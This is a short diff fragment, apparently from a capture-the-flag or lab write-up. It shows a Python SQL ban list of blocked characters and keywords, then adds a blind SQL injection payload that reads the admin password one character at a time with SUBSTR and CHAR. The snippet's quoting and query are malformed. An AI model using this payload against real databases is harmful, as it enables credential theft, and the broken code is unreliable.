@@ -10,4 +10,9 @@ SQL_BAN_LIST = [
     '$', '%', '&', '+', '.', ':', '<', '>', 'delay', 'wait', 'order', 'alter'
 ]
 ``` 
+ 
 
+```python
+query = 'SELECT * FROM users WHERE username = \'
+' or (SELECT SUBSTR((SELECT password WHERE username='admin'), 4, 1)) = CHAR(100);#
+\'
